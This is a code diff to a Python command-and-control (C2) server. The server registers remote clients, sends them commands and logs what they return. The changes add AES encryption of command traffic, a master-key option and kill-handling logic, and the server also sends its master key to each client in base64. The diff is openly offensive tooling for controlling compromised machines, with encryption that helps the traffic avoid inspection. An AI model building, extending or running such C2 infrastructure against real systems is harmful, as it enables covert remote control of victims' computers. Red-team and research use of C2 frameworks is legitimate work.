@@ -11,14 +11,17 @@ References:
 import asyncio
 import logging
 import time
+import os
 import uuid
 import argparse
+import base64
 from typing import Dict, List
-from message import Message
+from models.message import Message
 from models.send_receive_msgs import send_message, receive_message
 from models.client_state import ClientState
 from models.message_type import MessageType
 from models.command_type import CommandType
+from models.encryption_manager import EncryptionManager
 
 # ==================== CONFIGURATION ====================
 
@@ -33,12 +36,13 @@ logger = logging.getLogger(__name__)
 class C2Server:
     """Main C2 Server"""
     
-    def __init__(self, host: str, port: int):
+    def __init__(self, host: str, port: int, master_key: bytes):
         self.host = host
         self.port = port
         self.clients: Dict[str, ClientState] = {}
         self.shutdown = asyncio.Event()   # <-- shared shutdown signal
         self._server: asyncio.base_events.Server | None = None
+        self._encryption_manager = EncryptionManager(master_key)
     
     async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         """
@@ -46,8 +50,8 @@ class C2Server:
         """
         try:
             msg = await receive_message(reader)  # Receive registration message
+            msg = Message.from_payload(msg)
             if not msg or msg.type is not MessageType.REGISTER:
-                print(type(msg.type))
                 logger.warning(f"Invalid registration message: {msg.type} of type {type(msg.type)}")
                 writer.close()
                 return
@@ -56,7 +60,8 @@ class C2Server:
             self.clients[client_id] = client_state
             logger.info(f"Client registered: {client_id}")
             # Send acknowledgment
-            await send_message(writer, Message.as_ack(client_id))
+            master_key = base64.b64encode(self._encryption_manager.master_key).decode()
+            await send_message(writer, Message.as_ack(client_id, master_key).to_payload(True))
             # Main client loop
             await self._client_loop(client_state)
         except asyncio.CancelledError:
@@ -102,13 +107,16 @@ class C2Server:
                     break
                 if self.shutdown.is_set():
                     break
+                msg = self._encryption_manager.decrypt(msg)
                 if msg.type is MessageType.RESULT:
                     logger.info(f"Result from {client_state.client_id}: {msg.result[:100]}")
                     if msg.cmd_id in client_state.pending_results:
                         del client_state.pending_results[msg.cmd_id]   
-                        if client_state.pending_results:
-                            continue  # wait for all results to arrive
-                        client_state.set_killed()
+                        if client_state.is_killing:
+                            if client_state.pending_results:
+                                continue  # wait for all results to arrive
+                            else:
+                                client_state.set_killed()
                 else:
                     logger.warning(f"Unknown message type: {msg.type}")
             
@@ -133,9 +141,11 @@ class C2Server:
                 command = cmd_data.get("command")
                 
                 client_state.pending_results[cmd_id] = command
+                msg = Message.as_command(cmd_id, command)
+                msg = self._encryption_manager.encrypt(msg)
                 await send_message(
                     client_state.writer,
-                    Message.as_command(cmd_id, command)
+                    msg
                 )
                 logger.info(f"Command sent to {client_state.client_id}: {command}")
             
@@ -320,9 +330,24 @@ async def main():
     parser = argparse.ArgumentParser(description="C2 Server")
     parser.add_argument("--host", default="0.0.0.0", help="Bind host")
     parser.add_argument("--port", type=int, default=5000, help="Bind port")
+    parser.add_argument("--secret-key", help="Master key (32 hex chars for AES-256)")
 
     args = parser.parse_args()
-    server = C2Server(args.host, args.port)
+    # Generate or parse key
+    if args.secret_key:
+        try:
+            master_key = bytes.fromhex(args.secret_key)
+            if len(master_key) != 32:
+                raise ValueError("Key must be 32 bytes")
+        except:
+            print("Error: --secret-key must be 64 hex characters (32 bytes)")
+            return
+    else:
+        master_key = os.urandom(32)
+        print(f"Generated master key: {master_key.hex()}")
+        print("Use --secret-key to specify this for clients\n")
+
+    server = C2Server(args.host, args.port, master_key)
     
     # Run server and CLI concurrently
     await asyncio.gather(
